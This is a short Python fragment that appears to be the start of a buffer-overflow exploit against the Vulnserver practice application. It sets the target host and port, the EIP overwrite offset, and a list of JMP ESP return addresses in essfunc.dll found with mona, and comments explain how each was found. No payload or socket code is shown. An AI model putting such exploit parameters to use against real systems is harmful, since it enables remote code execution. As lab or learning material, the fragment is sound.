import struct
from pprint import pprint

PORT = 9999
HOST = '192.168.33.16'
SHELLCODE_OFFSET = 2003  # 2003 because pattern_offset.rb with 3200 length found 386F4337 as a val at position 2003

JMP_ESP = 0xFFE4  # from asking nasm_shell.rb for JMP ESP as an opcode

# we use essfunc.dll because the `!mona find` command in immunity
# tells us it has no memory protections.

# these were retrieved by searching for the JMP ESP instruction (aka 0xFFE4)
# using mona.py inside of immunity debugger like this:
# `!mona find -s '\xff\xe4' -m essfunc.dll`
ESSFUNC_DLL_JMP_LOCATIONS_INTS_BIG_ENDIAN = [
    0x625011AF,
    0x625011BB,
    0x625011C7,
    0x625011D3,
    0x625011DF,
    0x625011EB,
    0x625011F7,
    0x62501203,
    0x62501205,
]

# TODO don't hard code this
ESSFUNC_DLL_JMP_LOCATION_LITTLE_ENDIAN = '\xAF\x11\x50\x62'  # note each 1 byte is reversed
